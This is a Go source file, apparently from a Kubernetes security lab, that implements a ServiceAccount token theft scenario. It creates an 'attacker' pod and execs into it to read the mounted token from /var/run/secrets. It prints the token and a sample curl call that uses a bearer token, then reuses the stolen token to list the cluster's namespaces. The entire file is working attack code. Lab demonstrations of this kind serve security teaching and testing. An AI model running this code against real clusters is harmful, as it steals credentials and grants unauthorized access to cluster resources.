package scenarios

import (
	"bytes"
	"context"
	"fmt"
	"strings"
	"time"

	"k8s-security-lab/internal/cluster"

	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"

	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/kubernetes/scheme"
	"k8s.io/client-go/tools/remotecommand"
)

func TokenAttack() error {

	fmt.Println("[*] Starting ServiceAccount token theft scenario")

	client, err := cluster.GetClient()
	if err != nil {
		return err
	}

	cfg, err := cluster.GetConfig()
	if err != nil {
		return err
	}

	namespace := "tenant-a"
	podName := "token-attacker"

	fmt.Println("[*] Target namespace:", namespace)

	pod := &corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      podName,
			Namespace: namespace,
		},
		Spec: corev1.PodSpec{
			ServiceAccountName: "tenant-sa",
			Containers: []corev1.Container{
				{
					Name:  "attacker",
					Image: "alpine",
					Command: []string{
						"sleep",
						"3600",
					},
				},
			},
		},
	}

	fmt.Println("[*] Creating attacker pod")

	_, err = client.CoreV1().
		Pods(namespace).
		Create(context.Background(), pod, metav1.CreateOptions{})

	if err != nil {
		return err
	}

	fmt.Println("[+] Pod created")

	fmt.Println("[*] Waiting for pod to start")

	time.Sleep(5 * time.Second)

	fmt.Println("[*] Attempting token extraction")

	req := client.CoreV1().
		RESTClient().
		Post().
		Resource("pods").
		Name(podName).
		Namespace(namespace).
		SubResource("exec")

	req.VersionedParams(&corev1.PodExecOptions{
		Command: []string{
			"cat",
			"/var/run/secrets/kubernetes.io/serviceaccount/token",
		},
		Container: "attacker",
		Stdout:    true,
		Stderr:    true,
	}, scheme.ParameterCodec)

	exec, err := remotecommand.NewSPDYExecutor(cfg, "POST", req.URL())
	if err != nil {
		return err
	}

	var stdout bytes.Buffer
	var stderr bytes.Buffer

	err = exec.Stream(remotecommand.StreamOptions{
		Stdout: &stdout,
		Stderr: &stderr,
	})

	if err != nil {
		fmt.Println("[!] Token extraction failed")
		fmt.Println(stderr.String())
		return err
	}

	token := stdout.String()

	fmt.Println("[+] ServiceAccount token successfully extracted")

	fmt.Println("\nEvidence:")
	fmt.Println("-----------------------------------")
	fmt.Println(token)
	fmt.Println("-----------------------------------")

	fmt.Println("\nImpact:")

	fmt.Println("- Attacker can authenticate to the Kubernetes API")
	fmt.Println("- Permissions depend on ServiceAccount RBAC")

	fmt.Println("\nExample API abuse:")

	fmt.Println(`
curl -k \
-H "Authorization: Bearer <TOKEN>" \
https://kubernetes.default.svc/api/v1/namespaces
`)
	fmt.Println("[*] Using stolen token to query Kubernetes API")

	stolenConfig, err := cluster.GetConfig()
	if err != nil {
		return err
	}

	token = strings.TrimSpace(token)

	stolenConfig, err = cluster.GetConfig()
	if err != nil {
		return err
	}
	stolenConfig.BearerToken = token
	stolenConfig.BearerTokenFile = ""

	stolenClient, err := kubernetes.NewForConfig(stolenConfig)
	if err != nil {
		return err
	}

	namespaces, err := stolenClient.CoreV1().
		Namespaces().
		List(context.Background(), metav1.ListOptions{})

	if err != nil {

		fmt.Println("[!] Token authentication failed")

		fmt.Println("\nEvidence:")
		fmt.Println(err)

		return err
	}

	fmt.Println("[+] Token authentication successful")

	fmt.Println("\nEvidence:")
	fmt.Println("Namespaces accessible with stolen token:")

	for _, ns := range namespaces.Items {
		fmt.Printf(" - %s\n", ns.Name)
	}

	return nil
}
